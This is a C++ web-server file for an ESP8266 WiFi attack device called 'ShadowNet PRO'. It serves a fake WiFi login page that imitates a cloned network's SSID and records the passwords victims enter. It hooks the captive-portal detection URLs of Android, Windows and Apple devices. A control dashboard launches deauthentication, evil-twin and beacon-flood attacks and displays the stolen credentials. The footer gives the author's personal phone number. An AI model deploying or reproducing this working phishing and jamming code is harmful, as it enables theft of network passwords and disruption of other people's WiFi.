/*
 * web_server.cpp — ShadowNet PRO Web Dashboard
 *
 * Full control panel accessible via phone/laptop browser.
 */

#include "web_server.h"
#include "battery_manager.h"
#include "nrf_monitor.h"
#include "packet_injection.h"
#include "display_manager.h"
#include "wifi_scanner.h"
#include "wifi_attacks.h"
#include "evil_twin.h"
#include "settings.h"

static ESP8266WebServer _server(WEB_PORT);
static bool _serverActive = false;

// ── Captive Portal HTML ─────────────────────────────────────────
static const char _portalPage[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>WiFi Login Required</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;
background:linear-gradient(135deg,#0f0c29,#302b63,#24243e);min-height:100vh;
display:flex;align-items:center;justify-content:center;color:#fff}
.card{background:rgba(255,255,255,0.08);backdrop-filter:blur(20px);
border:1px solid rgba(255,255,255,0.15);border-radius:20px;padding:40px;
width:90%;max-width:380px;box-shadow:0 8px 32px rgba(0,0,0,0.4)}
.logo{text-align:center;margin-bottom:25px}
.logo svg{width:50px;height:50px;fill:#6C63FF}
h2{text-align:center;font-size:20px;margin-bottom:5px;color:#fff}
.sub{text-align:center;font-size:13px;color:rgba(255,255,255,0.6);margin-bottom:25px}
.ssid{color:#6C63FF;font-weight:700}
input{width:100%;padding:14px 16px;border:1px solid rgba(255,255,255,0.2);
border-radius:12px;background:rgba(255,255,255,0.05);color:#fff;
font-size:15px;margin-bottom:15px;outline:none;transition:.3s}
input:focus{border-color:#6C63FF;box-shadow:0 0 15px rgba(108,99,255,0.3)}
input::placeholder{color:rgba(255,255,255,0.4)}
button{width:100%;padding:14px;border:none;border-radius:12px;
background:linear-gradient(135deg,#6C63FF,#5A52D5);color:#fff;
font-size:16px;font-weight:600;cursor:pointer;transition:.3s;
box-shadow:0 4px 15px rgba(108,99,255,0.4)}
button:hover{transform:translateY(-2px);box-shadow:0 6px 20px rgba(108,99,255,0.6)}
.msg{text-align:center;font-size:12px;color:rgba(255,255,255,0.5);margin-top:15px}
.err{color:#FF6B6B;text-align:center;font-size:13px;margin-bottom:10px;display:none}
</style>
</head>
<body>
<div class="card">
<div class="logo">
<svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 17.93c-3.95-.49-7-3.85-7-7.93 0-.62.08-1.21.21-1.79L9 15v1c0 1.1.9 2 2 2v1.93zm6.9-2.54c-.26-.81-1-1.39-1.9-1.39h-1v-3c0-.55-.45-1-1-1H8v-2h2c.55 0 1-.45 1-1V7h2c1.1 0 2-.9 2-2v-.41c2.93 1.19 5 4.06 5 7.41 0 2.08-.8 3.97-2.1 5.39z"/></svg>
</div>
<h2>WiFi Authentication</h2>
<p class="sub">Enter password to connect to <span class="ssid">%SSID%</span></p>
<div class="err" id="err">Incorrect password. Please try again.</div>
<form action="/login" method="POST">
<input type="password" name="password" placeholder="Enter WiFi Password" required autofocus>
<button type="submit">Connect</button>
</form>
<p class="msg">Your connection is secured with WPA2 encryption</p>
</div>
</body>
</html>
)rawliteral";

static const char _successPage[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Connected</title>
<style>
body{font-family:-apple-system,sans-serif;background:linear-gradient(135deg,#0f0c29,#302b63,#24243e);
min-height:100vh;display:flex;align-items:center;justify-content:center;color:#fff}
.card{background:rgba(255,255,255,0.08);backdrop-filter:blur(20px);border:1px solid rgba(255,255,255,0.15);
border-radius:20px;padding:40px;width:90%;max-width:380px;text-align:center}
.check{font-size:60px;margin-bottom:15px}
h2{margin-bottom:10px}
p{color:rgba(255,255,255,0.6);font-size:14px}
</style>
</head>
<body>
<div class="card">
<div class="check">✓</div>
<h2>Authenticating...</h2>
<p>Please wait while we verify your credentials. You will be connected shortly.</p>
</div>
</body>
</html>
)rawliteral";

// ── Dashboard HTML ──────────────────────────────────────────────
static const char _dashPage[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>ShadowNet PRO</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
@import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Inter:wght@400;600;700&display=swap');
:root{--bg:#0a0a0f;--card:#12121a;--border:#1e1e2e;--accent:#6C63FF;
--accent2:#00d4aa;--danger:#ff4757;--warn:#ffa502;--text:#e1e1e6;
--dim:#6b7280;--glow:rgba(108,99,255,0.15)}
body{font-family:'Inter',sans-serif;background:var(--bg);color:var(--text);
min-height:100vh;padding:0}
.topbar{background:linear-gradient(135deg,#6C63FF,#5A52D5);padding:15px 20px;
display:flex;justify-content:space-between;align-items:center;
box-shadow:0 4px 20px rgba(108,99,255,0.3)}
.topbar h1{font-family:'JetBrains Mono',monospace;font-size:18px;color:#fff;
text-shadow:0 0 10px rgba(255,255,255,0.3)}
.topbar .info{font-size:11px;color:rgba(255,255,255,0.7)}
.tabs{display:flex;background:var(--card);border-bottom:1px solid var(--border)}
.tab{flex:1;text-align:center;padding:12px;font-size:12px;font-weight:600;cursor:pointer;
color:var(--dim);border-bottom:2px solid transparent;transition:.2s}
.tab.active{color:var(--accent);border-bottom-color:var(--accent)}
.tab-content{display:none}
.tab-content.active{display:block}
.container{padding:15px;max-width:600px;margin:0 auto}
.stats{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-bottom:15px}
.stat{background:var(--card);border:1px solid var(--border);border-radius:12px;
padding:12px;text-align:center}
.stat .val{font-size:24px;font-weight:700;color:var(--accent);
font-family:'JetBrains Mono',monospace}
.stat .lbl{font-size:11px;color:var(--dim);margin-top:4px;text-transform:uppercase}
.section{background:var(--card);border:1px solid var(--border);border-radius:12px;
margin-bottom:12px;overflow:hidden}
.section h2{font-size:13px;padding:10px 15px;background:rgba(108,99,255,0.1);
border-bottom:1px solid var(--border);color:var(--accent);
font-family:'JetBrains Mono',monospace;text-transform:uppercase;letter-spacing:1px}
.section .body{padding:12px 15px}
.form-group{margin-bottom:10px}
.form-group label{display:block;font-size:12px;color:var(--dim);margin-bottom:4px}
.form-group input{width:100%;padding:10px;border-radius:6px;border:1px solid var(--border);
background:var(--bg);color:var(--text);font-family:'Inter'}
.btn{display:inline-block;padding:10px 18px;border:none;border-radius:8px;
font-size:13px;font-weight:600;cursor:pointer;transition:.2s;margin:4px;
font-family:'Inter',sans-serif}
.btn-primary{background:var(--accent);color:#fff;box-shadow:0 2px 8px rgba(108,99,255,0.3)}
.btn-danger{background:var(--danger);color:#fff;box-shadow:0 2px 8px rgba(255,71,87,0.3)}
.btn-success{background:var(--accent2);color:#000;box-shadow:0 2px 8px rgba(0,212,170,0.3)}
.btn-warn{background:var(--warn);color:#000}
.btn:hover{transform:translateY(-1px);filter:brightness(1.15)}
.net-list{max-height:250px;overflow-y:auto;scrollbar-width:thin}
.net{padding:8px 12px;border-bottom:1px solid var(--border);display:flex;
justify-content:space-between;align-items:center;font-size:12px;cursor:pointer;}
.net:hover{background:var(--glow)}
.net .ssid{font-weight:600;color:var(--text)}
.net .meta{color:var(--dim);font-family:'JetBrains Mono',monospace;font-size:11px}
.net .actions{display:flex;gap:5px}
.net .actions button{padding:4px 8px;font-size:10px;border-radius:5px}
#log{background:#050508;border:1px solid var(--border);border-radius:8px;
padding:10px;font-family:'JetBrains Mono',monospace;font-size:11px;
color:var(--accent2);max-height:150px;overflow-y:auto;margin-top:10px}
.cred{background:rgba(255,71,87,0.1);border:1px solid rgba(255,71,87,0.3);
border-radius:8px;padding:10px;margin:5px 0;font-size:12px}
.cred .pw{color:var(--danger);font-weight:700;font-family:'JetBrains Mono',monospace}
.footer{text-align:center;padding:20px;color:var(--dim);font-size:11px}
.badge{display:inline-block;padding:2px 8px;border-radius:20px;font-size:10px;font-weight:600}
.badge-ok{background:rgba(0,212,170,0.2);color:var(--accent2)}
.badge-run{background:rgba(108,99,255,0.2);color:var(--accent)}
</style>
</head>
<body>
<div class="topbar">
<div><h1>⚡ ShadowNet PRO</h1>
<div class="info">Wireless Research Tool v2.0</div></div>
<div style="text-align:right">
<span class="badge badge-ok" id="statusBadge">ONLINE</span>
</div>
</div>
<div class="tabs">
<div class="tab active" onclick="showTab('dashboard')">Dashboard</div>
<div class="tab" onclick="showTab('settings')">Settings</div>
</div>

<div class="container">
<div id="dashboard" class="tab-content active">
<div class="stats">
<div class="stat"><div class="val" id="batt">--</div><div class="lbl">Battery %</div></div>
<div class="stat"><div class="val" id="uptime">--</div><div class="lbl">Uptime</div></div>
<div class="stat"><div class="val" id="heap">--</div><div class="lbl">Free RAM</div></div>
<div class="stat"><div class="val" id="clients">--</div><div class="lbl">AP Clients</div></div>
</div>

<div class="section">
<h2>📡 WiFi Scanner</h2>
<div class="body">
<button class="btn btn-primary" onclick="scanWifi()">Scan Networks</button>
<div class="net-list" id="networks"></div>
</div>
</div>

<div class="section">
<h2>⚔️ Attacks</h2>
<div class="body">
<button class="btn btn-danger" onclick="startBeacon()">Fake APs</button>
<button class="btn btn-danger" onclick="stopAttack()">Stop All</button>
<div id="atkStatus" style="margin-top:8px;font-size:12px;color:var(--dim)"></div>
</div>
</div>

<div class="section">
<h2>🔑 Captured Credentials</h2>
<div class="body" id="creds"><span style="color:var(--dim);font-size:12px">No credentials captured yet</span></div>
</div>

<div class="section">
<h2>📋 System Log</h2>
<div id="log">[SYS] ShadowNet PRO online<br>[SYS] Dashboard ready</div>
</div>
</div>

<div id="settings" class="tab-content">
<div class="section">
<h2>⚙️ Access Point Settings</h2>
<div class="body">
<div class="form-group">
<label>AP SSID (WiFi Name)</label>
<input type="text" id="cfg_ssid" maxlength="32">
</div>
<div class="form-group">
<label>AP Password (leave blank for Open)</label>
<input type="password" id="cfg_pass" maxlength="63">
</div>
<div class="form-group">
<label>AP Channel (1-11)</label>
<input type="number" id="cfg_ch" min="1" max="11">
</div>
<button class="btn btn-success" onclick="saveSettings()">Save & Reboot</button>
</div>
</div>
</div>

<div class="footer">
Created by <strong>Shawal Ahmad Mohmand</strong><br>
📱 +92 304 975 8182<br>
</div>
</div>

<script>
function showTab(id){
  document.querySelectorAll('.tab-content').forEach(e=>e.classList.remove('active'));
  document.querySelectorAll('.tab').forEach(e=>e.classList.remove('active'));
  document.getElementById(id).classList.add('active');
  event.target.classList.add('active');
}
function addLog(msg){
  var l=document.getElementById('log');
  l.innerHTML+='['+new Date().toLocaleTimeString()+'] '+msg+'<br>';
  l.scrollTop=l.scrollHeight;
}
function scanWifi(){
  addLog('Starting WiFi scan...');
  fetch('/api/scan').then(r=>r.json()).then(d=>{
    var h='';
    d.networks.forEach((n,i)=>{
      h+='<div class="net"><div><span class="ssid">'+n.ssid+'</span><br>';
      h+='<span class="meta">Ch:'+n.ch+' | '+n.rssi+'dBm | '+n.enc+'</span></div>';
      h+='<div class="actions">';
      h+='<button class="btn btn-danger" onclick="deauth('+i+')">Deauth</button>';
      h+='<button class="btn btn-warn" onclick="evilTwin('+i+')">Clone</button>';
      h+='</div></div>';
    });
    document.getElementById('networks').innerHTML=h;
    addLog('Found '+d.networks.length+' networks');
  });
}
function deauth(idx){ addLog('Starting deauth...'); fetch('/api/deauth?target='+idx); }
function evilTwin(idx){
  addLog('Evil Twin started. Connect to target WiFi to test phishing.');
  fetch('/api/eviltwin?target='+idx);
}
function startBeacon(){ addLog('Starting beacon flood...'); fetch('/api/beacon_start'); }
function stopAttack(){ addLog('Stopping all attacks...'); fetch('/api/stop_all'); }

function saveSettings(){
  var fd = new FormData();
  fd.append('ssid', document.getElementById('cfg_ssid').value);
  fd.append('pass', document.getElementById('cfg_pass').value);
  fd.append('ch', document.getElementById('cfg_ch').value);
  fetch('/api/settings', {method:'POST', body:fd}).then(r=>r.json()).then(d=>{
    alert('Settings saved. Device restarting.');
  });
}

function fetchSettings(){
  fetch('/api/settings').then(r=>r.json()).then(d=>{
    document.getElementById('cfg_ssid').value = d.ssid;
    document.getElementById('cfg_ch').value = d.ch;
  });
}
fetchSettings();

setInterval(()=>{
  fetch('/api/status').then(r=>r.json()).then(d=>{
    document.getElementById('batt').innerText=d.batt+'%';
    document.getElementById('uptime').innerText=d.uptime+'s';
    document.getElementById('heap').innerText=(d.heap/1024).toFixed(1)+'K';
    document.getElementById('clients').innerText=d.clients;
    var as=d.atk_status||'Idle';
    document.getElementById('atkStatus').innerHTML=
      '<span class="badge '+(as!='Idle'?'badge-run pulse':'badge-ok')+'">'+as+'</span>'+
      (d.atk_frames>0?' | Frames: '+d.atk_frames:'');
    if(d.cred_count>0){
      var ch='';
      d.creds.forEach(c=>{
        ch+='<div class="cred">SSID: '+c.ssid+'<br>Password: <span class="pw">'+c.pw+'</span></div>';
      });
      document.getElementById('creds').innerHTML=ch;
    }
  });
},2000);
</script>
</body>
</html>
)rawliteral";

// ── Scan Results Storage for Web API ────────────────────────────
static WifiNetwork _webScanResults[MAX_WIFI_RESULTS];
static uint8_t _webScanCount = 0;

// ── Interceptive Routing ────────────────────────────────────────

static bool _isCaptivePortal() {
  if (!evil_twin_isRunning()) return false;
  // If request is specifically asking for the dashboard, let it through
  if (_server.uri().startsWith("/api/") || _server.uri() == "/dashboard") {
    return false;
  }
  // Otherwise intercept for phishing
  return true;
}

static void _handleRoot() {
  if (_isCaptivePortal()) {
    String page = FPSTR(_portalPage);
    page.replace("%SSID%", evil_twin_getCloneSSID());
    _server.send(200, "text/html", page);
  } else {
    _server.send(200, "text/html", FPSTR(_dashPage));
  }
}

static void _handleDashboard() {
  _server.send(200, "text/html", FPSTR(_dashPage));
}

static void _handleLogin() {
  if (evil_twin_isRunning() && _server.hasArg("password")) {
    evil_twin_submitCred(_server.arg("password").c_str());
  }
  _server.send(200, "text/html", FPSTR(_successPage));
}

static void _handleNotFound() {
  if (_isCaptivePortal()) {
    _server.sendHeader("Location", "http://192.168.4.1/", true);
    _server.send(302, "text/plain", "");
  } else {
    _server.send(404, "text/plain", "Not Found");
  }
}

// ── Dashboard API ───────────────────────────────────────────────

static void _handleStatus() {
  String json = "{";
  json += "\"batt\":" + String(battery_getPercent()) + ",";
  json += "\"uptime\":" + String(millis() / 1000) + ",";
  json += "\"heap\":" + String(ESP.getFreeHeap()) + ",";
  json += "\"clients\":" + String(WiFi.softAPgetStationNum()) + ",";

  String atkStatus = "Idle";
  uint32_t atkFrames = 0;
  if (wifi_attacks_getState() == WATK_RUNNING) {
    atkStatus = "Deauth";
    atkFrames = wifi_attacks_getFrameCount();
  } else if (wifi_attacks_beacon_isRunning()) {
    atkStatus = "Beacon Flood";
    atkFrames = wifi_attacks_beacon_getCount();
  } else if (evil_twin_isRunning()) {
    atkStatus = "Evil Twin";
    atkFrames = evil_twin_getDeauthCount();
  }
  json += "\"atk_status\":\"" + atkStatus + "\",";
  json += "\"atk_frames\":" + String(atkFrames) + ",";

  json += "\"cred_count\":" + String(evil_twin_getCredCount()) + ",";
  json += "\"creds\":[";
  CapturedCred* creds = evil_twin_getCreds();
  for (uint8_t i = 0; i < evil_twin_getCredCount(); i++) {
    if (i > 0) json += ",";
    json += "{\"ssid\":\"" + String(creds[i].ssid) + "\",\"pw\":\"" + String(creds[i].password) + "\"}";
  }
  json += "]";
  json += "}";
  _server.send(200, "application/json", json);
}

static void _handleScan() {
  int n = WiFi.scanNetworks();
  _webScanCount = min((int)MAX_WIFI_RESULTS, n);

  String json = "{\"networks\":[";
  for (uint8_t i = 0; i < _webScanCount; i++) {
    strncpy(_webScanResults[i].ssid, WiFi.SSID(i).c_str(), 32);
    _webScanResults[i].ssid[32] = '\0';
    _webScanResults[i].rssi = WiFi.RSSI(i);
    _webScanResults[i].channel = WiFi.channel(i);
    _webScanResults[i].encType = WiFi.encryptionType(i);
    memcpy(_webScanResults[i].bssid, WiFi.BSSID(i), 6);

    if (i > 0) json += ",";
    json += "{\"ssid\":\"" + WiFi.SSID(i) + "\",";
    json += "\"rssi\":" + String(WiFi.RSSI(i)) + ",";
    json += "\"ch\":" + String(WiFi.channel(i)) + ",";
    json += "\"enc\":\"" + String(wifi_scanner_encLabel(WiFi.encryptionType(i))) + "\"}";
  }
  json += "]}";
  WiFi.scanDelete();
  _server.send(200, "application/json", json);
}

static void _handleDeauth() {
  if (_server.hasArg("target")) {
    int idx = _server.arg("target").toInt();
    if (idx >= 0 && idx < _webScanCount) {
      wifi_attacks_init();
      wifi_attacks_deauth_start(_webScanResults[idx].bssid, _webScanResults[idx].channel);
      _server.send(200, "application/json", "{\"ok\":true}");
      return;
    }
  }
  _server.send(400, "application/json", "{\"ok\":false}");
}

static void _handleEvilTwin() {
  if (_server.hasArg("target")) {
    int idx = _server.arg("target").toInt();
    if (idx >= 0 && idx < _webScanCount) {
      evil_twin_start(
        _webScanResults[idx].ssid,
        _webScanResults[idx].channel,
        _webScanResults[idx].bssid
      );
      _server.send(200, "application/json", "{\"ok\":true}");
      return;
    }
  }
  _server.send(400, "application/json", "{\"ok\":false}");
}

static void _handleBeaconStart() {
  wifi_attacks_beacon_start();
  _server.send(200, "application/json", "{\"ok\":true}");
}

static void _handleStopAll() {
  wifi_attacks_deauth_stop();
  wifi_attacks_beacon_stop();
  evil_twin_stop();
  _server.send(200, "application/json", "{\"ok\":true}");
}

static void _handleSettingsGet() {
  String json = "{";
  json += "\"ssid\":\"" + String(globalSettings.ap_ssid) + "\",";
  json += "\"ch\":" + String(globalSettings.ap_channel) + "}";
  _server.send(200, "application/json", json);
}

static void _handleSettingsPost() {
  if (_server.hasArg("ssid")) {
    strncpy(globalSettings.ap_ssid, _server.arg("ssid").c_str(), 32);
    globalSettings.ap_ssid[32] = '\0';
  }
  if (_server.hasArg("pass")) {
    strncpy(globalSettings.ap_pass, _server.arg("pass").c_str(), 64);
    globalSettings.ap_pass[64] = '\0';
  }
  if (_server.hasArg("ch")) {
    globalSettings.ap_channel = _server.arg("ch").toInt();
  }
  settings_save();
  _server.send(200, "application/json", "{\"ok\":true}");
  delay(500);
  ESP.restart(); // Reboot to apply settings
}

// ── Public API ──────────────────────────────────────────────────

void web_server_init() {
  settings_init();
  WiFi.mode(WIFI_AP_STA);
  
  if (globalSettings.ap_on) {
    WiFi.softAP(globalSettings.ap_ssid, globalSettings.ap_pass, globalSettings.ap_channel);
    DBGF("[WEB] AP Started: %s  IP: %s\n", globalSettings.ap_ssid, WiFi.softAPIP().toString().c_str());
  }

  // Dashboard + Phishing routing
  _server.on("/", _handleRoot);
  _server.on("/dashboard", _handleDashboard);
  _server.on("/login", HTTP_POST, _handleLogin);
  
  // Captive Portal catch-alls
  _server.on("/generate_204", _handleRoot);     // Android
  _server.on("/fwlink", _handleRoot);           // Windows
  _server.on("/hotspot-detect.html", _handleRoot); // Apple
  _server.on("/connecttest.txt", _handleRoot);  // Windows
  _server.on("/redirect", _handleRoot);
  _server.onNotFound(_handleNotFound);

  // APIs
  _server.on("/api/status", _handleStatus);
  _server.on("/api/scan", _handleScan);
  _server.on("/api/deauth", _handleDeauth);
  _server.on("/api/eviltwin", _handleEvilTwin);
  _server.on("/api/beacon_start", _handleBeaconStart);
  _server.on("/api/stop_all", _handleStopAll);
  _server.on("/api/settings", HTTP_GET, _handleSettingsGet);
  _server.on("/api/settings", HTTP_POST, _handleSettingsPost);

  _server.begin();
  _serverActive = true;
  DBGLN(F("[WEB] Server started"));
}

void web_server_update() {
  if (_serverActive) _server.handleClient();
}
